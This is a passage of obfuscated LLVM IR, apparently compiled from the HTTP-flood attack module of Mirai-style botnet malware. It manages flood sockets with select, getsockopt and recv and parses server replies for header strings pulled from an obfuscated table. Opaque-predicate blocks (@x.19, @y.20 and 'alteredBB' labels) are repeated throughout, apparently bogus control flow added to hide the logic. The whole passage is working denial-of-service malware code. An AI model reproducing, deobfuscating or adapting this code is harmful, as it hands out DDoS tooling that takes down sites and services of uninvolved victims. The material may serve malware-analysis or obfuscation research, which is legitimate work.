  %1456 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1457 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1456, i32 0, i32 0
  %1458 = load i32, i32* %1457, align 4
  %1459 = load i32, i32* %23, align 4
  %1460 = icmp sgt i32 %1458, %1459
  br i1 %1460, label %1461, label %1466

; <label>:1461:                                   ; preds = %1440
  %1462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1462, i32 0, i32 0
  %1464 = load i32, i32* %1463, align 4
  %1465 = add nsw i32 %1464, 1
  store i32 %1465, i32* %23, align 4
  br label %1466

; <label>:1466:                                   ; preds = %1461, %1440
  br label %1524

; <label>:1467:                                   ; preds = %originalBBpart2209
  %1468 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1469 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1468, i32 0, i32 1
  %1470 = load i8, i8* %1469, align 4
  %1471 = zext i8 %1470 to i32
  %1472 = icmp eq i32 %1471, 11
  br i1 %1472, label %1473, label %1498

; <label>:1473:                                   ; preds = %1467
  %1474 = load i32, i32* @x.19
  %1475 = load i32, i32* @y.20
  %1476 = sub i32 %1474, 1
  %1477 = mul i32 %1474, %1476
  %1478 = urem i32 %1477, 2
  %1479 = icmp eq i32 %1478, 0
  %1480 = icmp slt i32 %1475, 10
  %1481 = or i1 %1479, %1480
  br i1 %1481, label %originalBB211, label %originalBB211alteredBB

originalBB211:                                    ; preds = %originalBB211alteredBB, %1473
  %1482 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1482, i32 0, i32 1
  store i8 0, i8* %1483, align 4
  %1484 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1485 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1484, i32 0, i32 0
  %1486 = load i32, i32* %1485, align 4
  %1487 = call i32 @close(i32 %1486)
  %1488 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1489 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1488, i32 0, i32 0
  store i32 -1, i32* %1489, align 4
  %1490 = load i32, i32* @x.19
  %1491 = load i32, i32* @y.20
  %1492 = sub i32 %1490, 1
  %1493 = mul i32 %1490, %1492
  %1494 = urem i32 %1493, 2
  %1495 = icmp eq i32 %1494, 0
  %1496 = icmp slt i32 %1491, 10
  %1497 = or i1 %1495, %1496
  br i1 %1497, label %originalBBpart2213, label %originalBB211alteredBB

originalBBpart2213:                               ; preds = %originalBB211
  br label %1507

; <label>:1498:                                   ; preds = %1467
  %1499 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1499, i32 0, i32 1
  store i8 0, i8* %1500, align 4
  %1501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1501, i32 0, i32 0
  %1503 = load i32, i32* %1502, align 4
  %1504 = call i32 @close(i32 %1503)
  %1505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1505, i32 0, i32 0
  store i32 -1, i32* %1506, align 4
  br label %1507

; <label>:1507:                                   ; preds = %1498, %originalBBpart2213
  %1508 = load i32, i32* @x.19
  %1509 = load i32, i32* @y.20
  %1510 = sub i32 %1508, 1
  %1511 = mul i32 %1508, %1510
  %1512 = urem i32 %1511, 2
  %1513 = icmp eq i32 %1512, 0
  %1514 = icmp slt i32 %1509, 10
  %1515 = or i1 %1513, %1514
  br i1 %1515, label %originalBB215, label %originalBB215alteredBB

originalBB215:                                    ; preds = %originalBB215alteredBB, %1507
  %1516 = load i32, i32* @x.19
  %1517 = load i32, i32* @y.20
  %1518 = sub i32 %1516, 1
  %1519 = mul i32 %1516, %1518
  %1520 = urem i32 %1519, 2
  %1521 = icmp eq i32 %1520, 0
  %1522 = icmp slt i32 %1517, 10
  %1523 = or i1 %1521, %1522
  br i1 %1523, label %originalBBpart2217, label %originalBB215alteredBB

originalBBpart2217:                               ; preds = %originalBB215
  br label %1524

; <label>:1524:                                   ; preds = %originalBBpart2217, %1466
  br label %1525

; <label>:1525:                                   ; preds = %1524, %originalBBpart2205
  br label %1526

; <label>:1526:                                   ; preds = %1525, %1352
  br label %1527

; <label>:1527:                                   ; preds = %1526, %1319
  br label %1528

; <label>:1528:                                   ; preds = %1527, %943
  %1529 = load i32, i32* @x.19
  %1530 = load i32, i32* @y.20
  %1531 = sub i32 %1529, 1
  %1532 = mul i32 %1529, %1531
  %1533 = urem i32 %1532, 2
  %1534 = icmp eq i32 %1533, 0
  %1535 = icmp slt i32 %1530, 10
  %1536 = or i1 %1534, %1535
  br i1 %1536, label %originalBB219, label %originalBB219alteredBB

originalBB219:                                    ; preds = %originalBB219alteredBB, %1528
  %1537 = load i32, i32* @x.19
  %1538 = load i32, i32* @y.20
  %1539 = sub i32 %1537, 1
  %1540 = mul i32 %1537, %1539
  %1541 = urem i32 %1540, 2
  %1542 = icmp eq i32 %1541, 0
  %1543 = icmp slt i32 %1538, 10
  %1544 = or i1 %1542, %1543
  br i1 %1544, label %originalBBpart2221, label %originalBB219alteredBB

originalBBpart2221:                               ; preds = %originalBB219
  br label %1545

; <label>:1545:                                   ; preds = %originalBBpart2221, %878
  br label %1546

; <label>:1546:                                   ; preds = %1545, %originalBBpart2115, %783
  %1547 = load i32, i32* %9, align 4
  %1548 = add nsw i32 %1547, 1
  store i32 %1548, i32* %9, align 4
  br label %687

; <label>:1549:                                   ; preds = %687
  %1550 = load i32, i32* %23, align 4
  %1551 = icmp eq i32 %1550, 0
  br i1 %1551, label %1552, label %1553

; <label>:1552:                                   ; preds = %1549
  br label %664

; <label>:1553:                                   ; preds = %1549
  %1554 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1554, align 8
  %1555 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1555, align 8
  %1556 = load i32, i32* %23, align 4
  %1557 = call i32 @select(i32 %1556, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1557, i32* %24, align 4
  %1558 = call i64 @time(i64* null) #6
  %1559 = trunc i64 %1558 to i32
  store i32 %1559, i32* %27, align 4
  %1560 = load i32, i32* %24, align 4
  %1561 = icmp slt i32 %1560, 1
  br i1 %1561, label %1562, label %1579

; <label>:1562:                                   ; preds = %1553
  %1563 = load i32, i32* @x.19
  %1564 = load i32, i32* @y.20
  %1565 = sub i32 %1563, 1
  %1566 = mul i32 %1563, %1565
  %1567 = urem i32 %1566, 2
  %1568 = icmp eq i32 %1567, 0
  %1569 = icmp slt i32 %1564, 10
  %1570 = or i1 %1568, %1569
  br i1 %1570, label %originalBB223, label %originalBB223alteredBB

originalBB223:                                    ; preds = %originalBB223alteredBB, %1562
  %1571 = load i32, i32* @x.19
  %1572 = load i32, i32* @y.20
  %1573 = sub i32 %1571, 1
  %1574 = mul i32 %1571, %1573
  %1575 = urem i32 %1574, 2
  %1576 = icmp eq i32 %1575, 0
  %1577 = icmp slt i32 %1572, 10
  %1578 = or i1 %1576, %1577
  br i1 %1578, label %originalBBpart2225, label %originalBB223alteredBB

originalBBpart2225:                               ; preds = %originalBB223
  br label %664

; <label>:1579:                                   ; preds = %1553
  %1580 = load i32, i32* @x.19
  %1581 = load i32, i32* @y.20
  %1582 = sub i32 %1580, 1
  %1583 = mul i32 %1580, %1582
  %1584 = urem i32 %1583, 2
  %1585 = icmp eq i32 %1584, 0
  %1586 = icmp slt i32 %1581, 10
  %1587 = or i1 %1585, %1586
  br i1 %1587, label %originalBB227, label %originalBB227alteredBB

originalBB227:                                    ; preds = %originalBB227alteredBB, %1579
  store i32 0, i32* %9, align 4
  %1588 = load i32, i32* @x.19
  %1589 = load i32, i32* @y.20
  %1590 = sub i32 %1588, 1
  %1591 = mul i32 %1588, %1590
  %1592 = urem i32 %1591, 2
  %1593 = icmp eq i32 %1592, 0
  %1594 = icmp slt i32 %1589, 10
  %1595 = or i1 %1593, %1594
  br i1 %1595, label %originalBBpart2229, label %originalBB227alteredBB

originalBBpart2229:                               ; preds = %originalBB227
  br label %1596

; <label>:1596:                                   ; preds = %4179, %originalBBpart2229
  %1597 = load i32, i32* %9, align 4
  %1598 = load i32, i32* %18, align 4
  %1599 = icmp slt i32 %1597, %1598
  br i1 %1599, label %1600, label %4182

; <label>:1600:                                   ; preds = %1596
  %1601 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1602 = load i32, i32* %9, align 4
  %1603 = sext i32 %1602 to i64
  %1604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1601, i64 %1603
  store %struct.attack_http_state* %1604, %struct.attack_http_state** %26, align 8
  %1605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1605, i32 0, i32 0
  %1607 = load i32, i32* %1606, align 4
  %1608 = icmp eq i32 %1607, -1
  br i1 %1608, label %1609, label %1610

; <label>:1609:                                   ; preds = %1600
  br label %4179

; <label>:1610:                                   ; preds = %1600
  %1611 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1612 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1613 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1612, i32 0, i32 0
  %1614 = load i32, i32* %1613, align 4
  %1615 = sdiv i32 %1614, 64
  %1616 = sext i32 %1615 to i64
  %1617 = getelementptr inbounds [16 x i64], [16 x i64]* %1611, i64 0, i64 %1616
  %1618 = load i64, i64* %1617, align 8
  %1619 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1619, i32 0, i32 0
  %1621 = load i32, i32* %1620, align 4
  %1622 = srem i32 %1621, 64
  %1623 = zext i32 %1622 to i64
  %1624 = shl i64 1, %1623
  %1625 = and i64 %1618, %1624
  %1626 = icmp ne i64 %1625, 0
  br i1 %1626, label %1627, label %1667

; <label>:1627:                                   ; preds = %1610
  %1628 = load i32, i32* @x.19
  %1629 = load i32, i32* @y.20
  %1630 = sub i32 %1628, 1
  %1631 = mul i32 %1628, %1630
  %1632 = urem i32 %1631, 2
  %1633 = icmp eq i32 %1632, 0
  %1634 = icmp slt i32 %1629, 10
  %1635 = or i1 %1633, %1634
  br i1 %1635, label %originalBB231, label %originalBB231alteredBB

originalBB231:                                    ; preds = %originalBB231alteredBB, %1627
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1636 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1637 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1636, i32 0, i32 0
  %1638 = load i32, i32* %1637, align 4
  %1639 = bitcast i32* %35 to i8*
  %1640 = call i32 @getsockopt(i32 %1638, i32 1, i32 4, i8* %1639, i32* %36) #6
  store i32 %1640, i32* %12, align 4
  %1641 = load i32, i32* %35, align 4
  %1642 = icmp eq i32 %1641, 0
  %1643 = load i32, i32* @x.19
  %1644 = load i32, i32* @y.20
  %1645 = sub i32 %1643, 1
  %1646 = mul i32 %1643, %1645
  %1647 = urem i32 %1646, 2
  %1648 = icmp eq i32 %1647, 0
  %1649 = icmp slt i32 %1644, 10
  %1650 = or i1 %1648, %1649
  br i1 %1650, label %originalBBpart2234, label %originalBB231alteredBB

originalBBpart2234:                               ; preds = %originalBB231
  br i1 %1642, label %1651, label %1657

; <label>:1651:                                   ; preds = %originalBBpart2234
  %1652 = load i32, i32* %12, align 4
  %1653 = icmp eq i32 %1652, 0
  br i1 %1653, label %1654, label %1657

; <label>:1654:                                   ; preds = %1651
  %1655 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1656 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1655, i32 0, i32 1
  store i8 4, i8* %1656, align 4
  br label %1666

; <label>:1657:                                   ; preds = %1651, %originalBBpart2234
  %1658 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1659 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1658, i32 0, i32 0
  %1660 = load i32, i32* %1659, align 4
  %1661 = call i32 @close(i32 %1660)
  %1662 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1662, i32 0, i32 0
  store i32 -1, i32* %1663, align 4
  %1664 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1665 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1664, i32 0, i32 1
  store i8 0, i8* %1665, align 4
  br label %4179

; <label>:1666:                                   ; preds = %1654
  br label %1667

; <label>:1667:                                   ; preds = %1666, %1610
  %1668 = load i32, i32* @x.19
  %1669 = load i32, i32* @y.20
  %1670 = sub i32 %1668, 1
  %1671 = mul i32 %1668, %1670
  %1672 = urem i32 %1671, 2
  %1673 = icmp eq i32 %1672, 0
  %1674 = icmp slt i32 %1669, 10
  %1675 = or i1 %1673, %1674
  br i1 %1675, label %originalBB236, label %originalBB236alteredBB

originalBB236:                                    ; preds = %originalBB236alteredBB, %1667
  %1676 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1677 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1678 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1677, i32 0, i32 0
  %1679 = load i32, i32* %1678, align 4
  %1680 = sdiv i32 %1679, 64
  %1681 = sext i32 %1680 to i64
  %1682 = getelementptr inbounds [16 x i64], [16 x i64]* %1676, i64 0, i64 %1681
  %1683 = load i64, i64* %1682, align 8
  %1684 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1685 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1684, i32 0, i32 0
  %1686 = load i32, i32* %1685, align 4
  %1687 = srem i32 %1686, 64
  %1688 = zext i32 %1687 to i64
  %1689 = shl i64 1, %1688
  %1690 = and i64 %1683, %1689
  %1691 = icmp ne i64 %1690, 0
  %1692 = load i32, i32* @x.19
  %1693 = load i32, i32* @y.20
  %1694 = sub i32 %1692, 1
  %1695 = mul i32 %1692, %1694
  %1696 = urem i32 %1695, 2
  %1697 = icmp eq i32 %1696, 0
  %1698 = icmp slt i32 %1693, 10
  %1699 = or i1 %1697, %1698
  br i1 %1699, label %originalBBpart2268, label %originalBB236alteredBB

originalBBpart2268:                               ; preds = %originalBB236
  br i1 %1691, label %1700, label %4162

; <label>:1700:                                   ; preds = %originalBBpart2268
  %1701 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1702 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1701, i32 0, i32 1
  %1703 = load i8, i8* %1702, align 4
  %1704 = zext i8 %1703 to i32
  %1705 = icmp eq i32 %1704, 6
  br i1 %1705, label %1706, label %3469

; <label>:1706:                                   ; preds = %1700
  store i32 0, i32* %37, align 4
  %1707 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1707, i32 10240)
  %1708 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1709 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1708, i32 0, i32 0
  %1710 = load i32, i32* %1709, align 4
  %1711 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1712 = call i64 @recv(i32 %1710, i8* %1711, i64 10240, i32 16386)
  %1713 = trunc i64 %1712 to i32
  store i32 %1713, i32* %12, align 4
  %1714 = icmp slt i32 %1713, 1
  br i1 %1714, label %1715, label %1724

; <label>:1715:                                   ; preds = %1706
  %1716 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1717 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1716, i32 0, i32 0
  %1718 = load i32, i32* %1717, align 4
  %1719 = call i32 @close(i32 %1718)
  %1720 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1721 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1720, i32 0, i32 0
  store i32 -1, i32* %1721, align 4
  %1722 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1723 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1722, i32 0, i32 1
  store i8 0, i8* %1723, align 4
  br label %4179

; <label>:1724:                                   ; preds = %1706
  %1725 = load i32, i32* @x.19
  %1726 = load i32, i32* @y.20
  %1727 = sub i32 %1725, 1
  %1728 = mul i32 %1725, %1727
  %1729 = urem i32 %1728, 2
  %1730 = icmp eq i32 %1729, 0
  %1731 = icmp slt i32 %1726, 10
  %1732 = or i1 %1730, %1731
  br i1 %1732, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %1724
  %1733 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1734 = load i32, i32* %12, align 4
  %1735 = call i32 @util_memsearch(i8* %1733, i32 %1734, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1736 = icmp eq i32 %1735, -1
  %1737 = load i32, i32* @x.19
  %1738 = load i32, i32* @y.20
  %1739 = sub i32 %1737, 1
  %1740 = mul i32 %1737, %1739
  %1741 = urem i32 %1740, 2
  %1742 = icmp eq i32 %1741, 0
  %1743 = icmp slt i32 %1738, 10
  %1744 = or i1 %1742, %1743
  br i1 %1744, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br i1 %1736, label %1745, label %1749

; <label>:1745:                                   ; preds = %originalBBpart2272
  %1746 = load i32, i32* %12, align 4
  %1747 = icmp slt i32 %1746, 10240
  br i1 %1747, label %1748, label %1749

; <label>:1748:                                   ; preds = %1745
  br label %4179

; <label>:1749:                                   ; preds = %1745, %originalBBpart2272
  %1750 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1751 = load i32, i32* %12, align 4
  %1752 = call i32 @util_memsearch(i8* %1750, i32 %1751, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1753 = sext i32 %1752 to i64
  %1754 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1753
  store i8 0, i8* %1754, align 1
  %1755 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1756 = load i32, i32* %12, align 4
  %1757 = call i8* @table_retrieve_val(i32 71, i32* null)
  %1758 = call i32 @util_stristr(i8* %1755, i32 %1756, i8* %1757)
  %1759 = icmp ne i32 %1758, -1
  br i1 %1759, label %1760, label %1763

; <label>:1760:                                   ; preds = %1749
  %1761 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1762 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1761, i32 0, i32 11
  store i32 2, i32* %1762, align 4
  br label %1763

; <label>:1763:                                   ; preds = %1760, %1749
  %1764 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1765 = load i32, i32* %12, align 4
  %1766 = call i8* @table_retrieve_val(i32 70, i32* null)
  %1767 = call i32 @util_stristr(i8* %1764, i32 %1765, i8* %1766)
  %1768 = icmp ne i32 %1767, -1
  br i1 %1768, label %1769, label %1772

; <label>:1769:                                   ; preds = %1763
  %1770 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1771 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1770, i32 0, i32 11
  store i32 1, i32* %1771, align 4
  br label %1772

; <label>:1772:                                   ; preds = %1769, %1763
  %1773 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1774 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1773, i32 0, i32 12
  store i32 0, i32* %1774, align 4
  %1775 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1776 = load i32, i32* %12, align 4
  %1777 = call i8* @table_retrieve_val(i32 69, i32* null)
  %1778 = call i32 @util_stristr(i8* %1775, i32 %1776, i8* %1777)
  %1779 = icmp ne i32 %1778, -1
  br i1 %1779, label %1780, label %1863

; <label>:1780:                                   ; preds = %1772
  %1781 = load i32, i32* @x.19
  %1782 = load i32, i32* @y.20
  %1783 = sub i32 %1781, 1
  %1784 = mul i32 %1781, %1783
  %1785 = urem i32 %1784, 2
  %1786 = icmp eq i32 %1785, 0
  %1787 = icmp slt i32 %1782, 10
  %1788 = or i1 %1786, %1787
  br i1 %1788, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %1780
  %1789 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1790 = load i32, i32* %12, align 4
  %1791 = call i8* @table_retrieve_val(i32 69, i32* null)
  %1792 = call i32 @util_stristr(i8* %1789, i32 %1790, i8* %1791)
  store i32 %1792, i32* %38, align 4
  %1793 = load i32, i32* %38, align 4
  %1794 = sext i32 %1793 to i64
  %1795 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1794
  %1796 = load i8, i8* %1795, align 1
  %1797 = sext i8 %1796 to i32
  %1798 = icmp eq i32 %1797, 32
  %1799 = load i32, i32* @x.19
  %1800 = load i32, i32* @y.20
  %1801 = sub i32 %1799, 1
  %1802 = mul i32 %1799, %1801
  %1803 = urem i32 %1802, 2
  %1804 = icmp eq i32 %1803, 0
  %1805 = icmp slt i32 %1800, 10
  %1806 = or i1 %1804, %1805
  br i1 %1806, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br i1 %1798, label %1807, label %1826

; <label>:1807:                                   ; preds = %originalBBpart2276
  %1808 = load i32, i32* @x.19
  %1809 = load i32, i32* @y.20
  %1810 = sub i32 %1808, 1
  %1811 = mul i32 %1808, %1810
  %1812 = urem i32 %1811, 2
  %1813 = icmp eq i32 %1812, 0
  %1814 = icmp slt i32 %1809, 10
  %1815 = or i1 %1813, %1814
  br i1 %1815, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %1807
  %1816 = load i32, i32* %38, align 4
  %1817 = add nsw i32 %1816, 1
  store i32 %1817, i32* %38, align 4
  %1818 = load i32, i32* @x.19
  %1819 = load i32, i32* @y.20
  %1820 = sub i32 %1818, 1
  %1821 = mul i32 %1818, %1820
  %1822 = urem i32 %1821, 2
  %1823 = icmp eq i32 %1822, 0
  %1824 = icmp slt i32 %1819, 10
  %1825 = or i1 %1823, %1824
  br i1 %1825, label %originalBBpart2285, label %originalBB278alteredBB

originalBBpart2285:                               ; preds = %originalBB278
  br label %1826

; <label>:1826:                                   ; preds = %originalBBpart2285, %originalBBpart2276
  %1827 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1828 = load i32, i32* %38, align 4
  %1829 = sext i32 %1828 to i64
  %1830 = getelementptr inbounds i8, i8* %1827, i64 %1829
  %1831 = load i32, i32* %12, align 4
  %1832 = load i32, i32* %38, align 4
  %1833 = sub nsw i32 %1831, %1832
  %1834 = call i32 @util_memsearch(i8* %1830, i32 %1833, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1834, i32* %39, align 4
  %1835 = load i32, i32* %39, align 4
  %1836 = icmp ne i32 %1835, -1
  br i1 %1836, label %1837, label %1862

; <label>:1837:                                   ; preds = %1826
  %1838 = load i32, i32* %38, align 4
  %1839 = sext i32 %1838 to i64
  %1840 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1839
  store i8* %1840, i8** %40, align 8
  %1841 = load i32, i32* %39, align 4
  %1842 = icmp sge i32 %1841, 2
  br i1 %1842, label %1843, label %1846

; <label>:1843:                                   ; preds = %1837
  %1844 = load i32, i32* %39, align 4
  %1845 = sub nsw i32 %1844, 2
  store i32 %1845, i32* %39, align 4
  br label %1846

; <label>:1846:                                   ; preds = %1843, %1837
  %1847 = load i32, i32* %38, align 4
  %1848 = load i32, i32* %39, align 4
  %1849 = add nsw i32 %1847, %1848
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1850
  store i8 0, i8* %1851, align 1
  %1852 = load i8*, i8** %40, align 8
  %1853 = load i8*, i8** %40, align 8
  %1854 = call i32 @util_strlen(i8* %1853)
  %1855 = call i8* @table_retrieve_val(i32 68, i32* null)
  %1856 = call i32 @util_stristr(i8* %1852, i32 %1854, i8* %1855)
  %1857 = icmp ne i32 %1856, 0
  br i1 %1857, label %1858, label %1861

; <label>:1858:                                   ; preds = %1846
  %1859 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1860 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1859, i32 0, i32 12
  store i32 1, i32* %1860, align 4
  br label %1861

; <label>:1861:                                   ; preds = %1858, %1846
  br label %1862

; <label>:1862:                                   ; preds = %1861, %1826
  br label %1863

; <label>:1863:                                   ; preds = %1862, %1772
  %1864 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1865 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1864, i32 0, i32 13
  store i32 0, i32* %1865, align 4
  %1866 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1867 = load i32, i32* %12, align 4
  %1868 = call i8* @table_retrieve_val(i32 66, i32* null)
  %1869 = call i32 @util_stristr(i8* %1866, i32 %1867, i8* %1868)
  %1870 = icmp ne i32 %1869, -1
  br i1 %1870, label %1871, label %2018

; <label>:1871:                                   ; preds = %1863
  %1872 = load i32, i32* @x.19
  %1873 = load i32, i32* @y.20
  %1874 = sub i32 %1872, 1
  %1875 = mul i32 %1872, %1874
  %1876 = urem i32 %1875, 2
  %1877 = icmp eq i32 %1876, 0
  %1878 = icmp slt i32 %1873, 10
  %1879 = or i1 %1877, %1878
  br i1 %1879, label %originalBB287, label %originalBB287alteredBB

originalBB287:                                    ; preds = %originalBB287alteredBB, %1871
  %1880 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1881 = load i32, i32* %12, align 4
  %1882 = call i8* @table_retrieve_val(i32 66, i32* null)
  %1883 = call i32 @util_stristr(i8* %1880, i32 %1881, i8* %1882)
  store i32 %1883, i32* %41, align 4
  %1884 = load i32, i32* %41, align 4
  %1885 = sext i32 %1884 to i64
  %1886 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1885
  %1887 = load i8, i8* %1886, align 1
  %1888 = sext i8 %1887 to i32
  %1889 = icmp eq i32 %1888, 32
  %1890 = load i32, i32* @x.19
  %1891 = load i32, i32* @y.20
  %1892 = sub i32 %1890, 1
  %1893 = mul i32 %1890, %1892
  %1894 = urem i32 %1893, 2
  %1895 = icmp eq i32 %1894, 0
  %1896 = icmp slt i32 %1891, 10
  %1897 = or i1 %1895, %1896
  br i1 %1897, label %originalBBpart2289, label %originalBB287alteredBB

originalBBpart2289:                               ; preds = %originalBB287
  br i1 %1889, label %1898, label %1917

; <label>:1898:                                   ; preds = %originalBBpart2289
  %1899 = load i32, i32* @x.19
  %1900 = load i32, i32* @y.20
  %1901 = sub i32 %1899, 1
  %1902 = mul i32 %1899, %1901
  %1903 = urem i32 %1902, 2
  %1904 = icmp eq i32 %1903, 0
  %1905 = icmp slt i32 %1900, 10
  %1906 = or i1 %1904, %1905
  br i1 %1906, label %originalBB291, label %originalBB291alteredBB

originalBB291:                                    ; preds = %originalBB291alteredBB, %1898
  %1907 = load i32, i32* %41, align 4
  %1908 = add nsw i32 %1907, 1
  store i32 %1908, i32* %41, align 4
  %1909 = load i32, i32* @x.19
  %1910 = load i32, i32* @y.20
  %1911 = sub i32 %1909, 1
  %1912 = mul i32 %1909, %1911
  %1913 = urem i32 %1912, 2
  %1914 = icmp eq i32 %1913, 0
  %1915 = icmp slt i32 %1910, 10
  %1916 = or i1 %1914, %1915
  br i1 %1916, label %originalBBpart2295, label %originalBB291alteredBB

originalBBpart2295:                               ; preds = %originalBB291
  br label %1917

; <label>:1917:                                   ; preds = %originalBBpart2295, %originalBBpart2289
  %1918 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1919 = load i32, i32* %41, align 4
  %1920 = sext i32 %1919 to i64
  %1921 = getelementptr inbounds i8, i8* %1918, i64 %1920
  %1922 = load i32, i32* %12, align 4
  %1923 = load i32, i32* %41, align 4
  %1924 = sub nsw i32 %1922, %1923
  %1925 = call i32 @util_memsearch(i8* %1921, i32 %1924, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1925, i32* %42, align 4
  %1926 = load i32, i32* %42, align 4
  %1927 = icmp ne i32 %1926, -1
  br i1 %1927, label %1928, label %2001

; <label>:1928:                                   ; preds = %1917
  %1929 = load i32, i32* @x.19
  %1930 = load i32, i32* @y.20
  %1931 = sub i32 %1929, 1
  %1932 = mul i32 %1929, %1931
  %1933 = urem i32 %1932, 2
  %1934 = icmp eq i32 %1933, 0
  %1935 = icmp slt i32 %1930, 10
  %1936 = or i1 %1934, %1935
